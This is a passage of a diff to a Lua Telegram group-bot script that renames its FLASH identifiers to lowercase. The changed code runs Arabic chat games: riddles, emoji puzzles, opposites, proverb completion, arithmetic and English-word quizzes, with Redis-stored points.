الآن؟💭","‏- فنان/ة تود لو يدعوكَ على مائدة عشاء؟😁❤","‏- تخيّل شيء قد يحدث في المستقبل؟","‏- للشباب | آخر مرة وصلك غزل من فتاة؟🌚","شخص أو صاحب عوضك ونساك مُر الحياة ما اسمه ؟","| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث شو راح تكون ؟.", }  
-FLASH2 = math.random(#FLASH)
-FLASHdx(msg.chat_id_, msg.id_, 1, FLASH[FLASH2] , 1, 'md')  
+local flash = {  "آخر مرة زرت مدينة الملاهي؟",  "آخر مرة أكلت أكلتك المفضّلة؟",  "الوضع الحالي؟\n‏1. سهران\n‏2. ضايج\n‏3. أتأمل",  "آخر شيء ضاع منك؟","كلمة أخيرة لشاغل البال؟","طريقتك المعتادة في التخلّص من الطاقة السلبية؟","شهر من أشهر العام له ذكرى جميلة معك؟","كلمة غريبة من لهجتك ومعناها؟🤓","‏- شيء سمعته عالق في ذهنك هاليومين؟","متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟","‏- أبرز صفة حسنة في صديقك المقرب؟","هل تشعر أن هنالك مَن يُحبك؟","اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟","أجمل شيء حصل معك خلال هاليوم؟","صِف شعورك وأنت تُحب شخص يُحب غيرك؟👀💔","كلمة لشخص غالي اشتقت إليه؟💕","آخر خبر سعيد، متى وصلك؟","أنا آسف على ....؟","أوصف نفسك بكلمة؟","صريح، مشتاق؟","‏- صريح، هل سبق وخذلت أحدهم ولو عن غير قصد؟","‏- ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭","‏- فنان/ة تود لو يدعوكَ على مائدة عشاء؟😁❤","‏- تخيّل شيء قد يحدث في المستقبل؟","‏- للشباب | آخر مرة وصلك غزل من فتاة؟🌚","شخص أو صاحب عوضك ونساك مُر الحياة ما اسمه ؟","| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث شو راح تكون ؟.", }  
+flash2 = math.random(#flash)
+flashdx(msg.chat_id_, msg.id_, 1, flash[flash2] , 1, 'md')  
 end
---     By Developer FLASH     -- 
-if text == 'محيبس' or text == 'بات' or text == 'المحيبس' and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
-return "FLASH"
+--     By Developer flash     -- 
+if text == 'محيبس' or text == 'بات' or text == 'المحيبس' and flash11(msg) then
+if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
+return "flash"
 end
 Num = math.random(1,6)
-FLASHdx1:set(FLASH.."GAMES"..msg.chat_id_,Num) 
+flashdx1:set(flash.."GAMES"..msg.chat_id_,Num) 
 TEST = [[
 *➀       ➁     ➂      ➃      ➄     ➅
 ↓      ↓     ↓      ↓     ↓     ↓
@@ -3605,19 +3605,19 @@ TEST = [[
 ❅∫ اختر رقم يد لاستخراج المحيبس ،
 ❅∫ الفائز يحصل على { 5 } النقاط .*
 ]]
-FLASHdx( msg.chat_id_, msg.id_, 1, TEST, 1, "md")
-FLASHdx1:setex(FLASH.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
+flashdx( msg.chat_id_, msg.id_, 1, TEST, 1, "md")
+flashdx1:setex(flash.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
 return false  
 end
-if text == 'حزوره' and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
-return "FLASH"
+if text == 'حزوره' and flash11(msg) then
+if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
+return "flash"
 end
-FLASHdx1:del(FLASH..'bot:l:id'..msg.chat_id_)
-FLASH2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
-name = FLASH2[math.random(#FLASH2)]
-FLASHdx1:set(FLASH..'bot:bkbk'..msg.chat_id_,name)
+flashdx1:del(flash..'bot:l:id'..msg.chat_id_)
+flash2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
+name = flash2[math.random(#flash2)]
+flashdx1:set(flash..'bot:bkbk'..msg.chat_id_,name)
 name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟') name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
 name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟') name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
 name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ') name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
@@ -3634,26 +3634,26 @@ name = string.gsub(name,'العمر','ما هو الشيء الذي كلما ط�
 name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ') name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
 name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟') name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
 name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟') name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟') name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
-FLASH = '❅∫ اول واحد يحلها  {'..name..'} يربح '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
+flash = '❅∫ اول واحد يحلها  {'..name..'} يربح '
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
 end
-if text == ''..(FLASHdx1:get(FLASH..'bot:bkbk'..msg.chat_id_) or 'لفاتع')..'' and not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then
-if not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then 
-FLASH = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل حزوره . '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
-FLASHdx1:incrby(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == ''..(flashdx1:get(flash..'bot:bkbk'..msg.chat_id_) or 'لفاتع')..'' and not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then
+if not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then 
+flash = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل حزوره . '
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
+flashdx1:incrby(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-FLASHdx1:set(FLASH..'bot:l:id'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:l:id'..msg.chat_id_,true)
 end
-if text == 'المعاني' and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
-return "FLASH"
+if text == 'المعاني' and flash11(msg) then
+if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
+return "flash"
 end
-FLASHdx1:del(FLASH..'bot:l:id'..msg.chat_id_)
-FLASH2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
-name = FLASH2[math.random(#FLASH2)]
-FLASHdx1:set(FLASH..'bot:bkbk2'..msg.chat_id_,name)
+flashdx1:del(flash..'bot:l:id'..msg.chat_id_)
+flash2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
+name = flash2[math.random(#flash2)]
+flashdx1:set(flash..'bot:bkbk2'..msg.chat_id_,name)
 name = string.gsub(name,'قرد','🐒') name = string.gsub(name,'دجاجه','🐔')
 name = string.gsub(name,'بطريق','🐧') name = string.gsub(name,'ضفدع','🐸')
 name = string.gsub(name,'بومه','🦉') name = string.gsub(name,'نحله','🐝')
@@ -3666,26 +3666,26 @@ name = string.gsub(name,'اسد','🦁') name = string.gsub(name,'فأر','🐭'
 name = string.gsub(name,'ذئب','🐺') name = string.gsub(name,'فراشه','🦋')
 name = string.gsub(name,'عقرب','🦂') name = string.gsub(name,'زرافه','🦒')
 name = string.gsub(name,'قنفذ','🦔') name = string.gsub(name,'تفاحه','🍎') name = string.gsub(name,'باذنجان','🍆')
-FLASH = '❅∫ ما معنى هذا السمايل ؟  {'..name..'} '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
+flash = '❅∫ ما معنى هذا السمايل ؟  {'..name..'} '
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
 end
-if text == ''..(FLASHdx1:get(FLASH..'bot:bkbk2'..msg.chat_id_) or 'لفاتع')..'' and not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then
-if not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then 
-FLASH = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل المعاني . '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
-FLASHdx1:incrby(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == ''..(flashdx1:get(flash..'bot:bkbk2'..msg.chat_id_) or 'لفاتع')..'' and not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then
+if not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then 
+flash = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل المعاني . '
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
+flashdx1:incrby(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-FLASHdx1:set(FLASH..'bot:l:id'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:l:id'..msg.chat_id_,true)
 end
-if text == 'العكس' and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
-return "FLASH"
+if text == 'العكس' and flash11(msg) then
+if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
+return "flash"
 end
-FLASHdx1:del(FLASH..'bot:l:id'..msg.chat_id_)
-FLASH2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
-name = FLASH2[math.random(#FLASH2)]
-FLASHdx1:set(FLASH..'bot:bkbk3'..msg.chat_id_,name)
+flashdx1:del(flash..'bot:l:id'..msg.chat_id_)
+flash2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
+name = flash2[math.random(#flash2)]
+flashdx1:set(flash..'bot:bkbk3'..msg.chat_id_,name)
 name = string.gsub(name,'باي','هلو')
 name = string.gsub(name,'فهمت','مافهمت')
 name = string.gsub(name,'موزين','زين')
@@ -3711,27 +3711,27 @@ name = string.gsub(name,'موعطشان','عطشان')
 name = string.gsub(name,'خوش ولد','موخوش ولد')
 name = string.gsub(name,'اني','مطي')
 name = string.gsub(name,'هادئ','عصبي')
-FLASH = '❅∫ عكس كلمه ~ {'..name..'} '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
+flash = '❅∫ عكس كلمه ~ {'..name..'} '
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
 end
-if text == ''..(FLASHdx1:get(FLASH..'bot:bkbk3'..msg.chat_id_) or 'لفاتع')..'' and not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then
-if not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then 
-FLASH = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل العكس . '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
-FLASHdx1:incrby(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == ''..(flashdx1:get(flash..'bot:bkbk3'..msg.chat_id_) or 'لفاتع')..'' and not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then
+if not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then 
+flash = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل العكس . '
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
+flashdx1:incrby(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-FLASHdx1:set(FLASH..'bot:l:id'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:l:id'..msg.chat_id_,true)
 end
-if text == 'المختلف' and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
-return "FLASH"
+if text == 'المختلف' and flash11(msg) then
+if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
+return "flash"
 end
-FLASHdx1:del(FLASH..'bot:l:id'..msg.chat_id_)
-FLASH2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧜‍♂','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',
+flashdx1:del(flash..'bot:l:id'..msg.chat_id_)
+flash2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧜‍♂','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',
 };
-name = FLASH2[math.random(#FLASH2)]
-FLASHdx1:set(FLASH..'bot:bkbk4'..msg.chat_id_,name)
+name = flash2[math.random(#flash2)]
+flashdx1:set(flash..'bot:bkbk4'..msg.chat_id_,name)
 name = string.gsub(name,'😸','😹😹😹😹😹😹😹😹😸😹😹😹😹') name = string.gsub(name,'☠','💀💀💀💀💀💀💀☠💀💀💀💀💀')
 name = string.gsub(name,'??','👻👻👻👻👻👻👻🐼👻👻👻👻👻') name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊')
 name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚🌚') name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑🌑')
@@ -3745,28 +3745,28 @@ name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️
 name = string.gsub(name,'👬','👭👭👭👭👭👬👭👭👭') name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
 name = string.gsub(name,'🕒','🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒') name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥🕥')
 name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⏳⌛️⏳⏳') name = string.gsub(name,'📅','📆📆📆📆📆📆📅📆📆')
-FLASH = '❅∫ اول واحد يطلع المختلف {'..name..'} يربح ،'
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
+flash = '❅∫ اول واحد يطلع المختلف {'..name..'} يربح ،'
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
 end
-if text == ''..(FLASHdx1:get(FLASH..'bot:bkbk4'..msg.chat_id_) or 'لفاتع')..'' and not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then
-if not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then 
-FLASH = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل المختلف . '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
-FLASHdx1:incrby(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == ''..(flashdx1:get(flash..'bot:bkbk4'..msg.chat_id_) or 'لفاتع')..'' and not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then
+if not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then 
+flash = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل المختلف . '
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
+flashdx1:incrby(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-FLASHdx1:set(FLASH..'bot:l:id'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:l:id'..msg.chat_id_,true)
 end  
-if text == 'امثله' and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
-return "FLASH"
+if text == 'امثله' and flash11(msg) then
+if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
+return "flash"
 end
-FLASHdx1:del(FLASH..'bot:l:id'..msg.chat_id_)
-FLASH2 = {
+flashdx1:del(flash..'bot:l:id'..msg.chat_id_)
+flash2 = {
 'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
 };
-name = FLASH2[math.random(#FLASH2)]
-FLASHdx1:set(FLASH..'bot:bkbk5'..msg.chat_id_,name)
+name = flash2[math.random(#flash2)]
+flashdx1:set(flash..'bot:bkbk5'..msg.chat_id_,name)
 name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
 name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
 name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
@@ -3787,52 +3787,52 @@ name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
 name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
 name = string.gsub(name,'القرد',' ___ بعين امه غزال')
 name = string.gsub(name,'يكحله','اجه ___ عماها')
-FLASH = '❅∫ اكمل المثل التالي \n {'..name..'}'
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
+flash = '❅∫ اكمل المثل التالي \n {'..name..'}'
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
 end 
-if text == ''..(FLASHdx1:get(FLASH..'bot:bkbk5'..msg.chat_id_) or 'لفاتع')..'' and not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then
-if not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then 
-FLASH = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل امثله . '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
-FLASHdx1:incrby(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == ''..(flashdx1:get(flash..'bot:bkbk5'..msg.chat_id_) or 'لفاتع')..'' and not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then
+if not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then 
+flash = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل امثله . '
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
+flashdx1:incrby(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-FLASHdx1:set(FLASH..'bot:l:id'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:l:id'..msg.chat_id_,true)
 end  
-if text == 'رياضيات' and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
-return "FLASH"
+if text == 'رياضيات' and flash11(msg) then
+if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
+return "flash"
 end
-FLASHdx1:del(FLASH..'bot:l:id'..msg.chat_id_)
-FLASH2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
-name = FLASH2[math.random(#FLASH2)]
-FLASHdx1:set(FLASH..'bot:bkbk6'..msg.chat_id_,name)
+flashdx1:del(flash..'bot:l:id'..msg.chat_id_)
+flash2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
+name = flash2[math.random(#flash2)]
+flashdx1:set(flash..'bot:bkbk6'..msg.chat_id_,name)
 name = string.gsub(name,'9','7 + 2 = ?') name = string.gsub(name,'46','41 + 5 = ?')
 name = string.gsub(name,'2','5 - 3 = ?') name = string.gsub(name,'9','5 + 2 + 2 = ?')
 name = string.gsub(name,'5','8 - 3 = ?') name = string.gsub(name,'4','40 ÷ 10 = ?')
 name = string.gsub(name,'25','30 - 5 = ?') name = string.gsub(name,'10','100 ÷ 10 = ?')
 name = string.gsub(name,'17','10 + 5 + 2 = ?') name = string.gsub(name,'15','25 - 10 = ?')
 name = string.gsub(name,'39','44 - 5 = ?') name = string.gsub(name,'5','12 + 1 - 8 = ?') name = string.gsub(name,'16','16 + 16 - 16 = ?')
-FLASH = '❅∫ اكمل المعادله ،\n - {'..name..'} .'
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
+flash = '❅∫ اكمل المعادله ،\n - {'..name..'} .'
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
 end 
-if text == ''..(FLASHdx1:get(FLASH..'bot:bkbk6'..msg.chat_id_) or 'لفاتع')..'' and not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then
-if not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then 
-FLASH = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل رياضيات . '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
-FLASHdx1:incrby(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == ''..(flashdx1:get(flash..'bot:bkbk6'..msg.chat_id_) or 'لفاتع')..'' and not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then
+if not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then 
+flash = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل رياضيات . '
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
+flashdx1:incrby(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-FLASHdx1:set(FLASH..'bot:l:id'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:l:id'..msg.chat_id_,true)
 end
-if text == 'انكليزي' and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
-return "FLASH"
+if text == 'انكليزي' and flash11(msg) then
+if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
+return "flash"
 end
-FLASHdx1:del(FLASH..'bot:l:id'..msg.chat_id_)
-FLASH2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
-name = FLASH2[math.random(#FLASH2)]
-FLASHdx1:set(FLASH..'bot:bkbk7'..msg.chat_id_,name)
+flashdx1:del(flash..'bot:l:id'..msg.chat_id_)
+flash2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
+name = flash2[math.random(#flash2)]
+flashdx1:set(flash..'bot:bkbk7'..msg.chat_id_,name)
 name = string.gsub(name,'ذئب','Wolf') name = string.gsub(name,'معلومات','Information')
 name = string.gsub(name,'قنوات','Channels') name = string.gsub(name,'مجموعات','Groups')
 name = string.gsub(name,'كتاب','Book') name = string.gsub(name,'تفاحه','Apple')
@@ -3840,64 +3840,64 @@ name = string.gsub(name,'نقود','money') name = string.gsub(name,'اعلم','
 name = string.gsub(name,'تمساح','crocodile') name = string.gsub(name,'شاطئ','Beach')
 name = string.gsub(name,'غبي','Stupid') name = string.gsub(name,'صداقه','Friendchip')
 name = string.gsub(name,'ذكي','Smart') 
-FLASH = '❅∫ ما معنى كلمه {'..name..'} ، '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
+flash = '❅∫ ما معنى كلمه {'..name..'} ، '
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
 end
-if text == ''..(FLASHdx1:get(FLASH..'bot:bkbk7'..msg.chat_id_) or 'لفاتع')..'' and not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then
-if not FLASHdx1:get(FLASH..'bot:l:id'..msg.chat_id_) then 
-FLASH = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل انكليزي . '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md')
-FLASHdx1:incrby(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == ''..(flashdx1:get(flash..'bot:bkbk7'..msg.chat_id_) or 'لفاتع')..'' and not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then
+if not flashdx1:get(flash..'bot:l:id'..msg.chat_id_) then 
+flash = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل انكليزي . '
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md')
+flashdx1:incrby(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-FLASHdx1:set(FLASH..'bot:l:id'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:l:id'..msg.chat_id_,true)
 end
---     By Developer FLASH     -- 
-if FLASHdx1:get(FLASH.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
+--     By Developer flash     -- 
+if flashdx1:get(flash.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
 if text and text:match("^(%d+)$") then
 local NUM = text:match("^(%d+)$")
 if tonumber(NUM) > 20 then
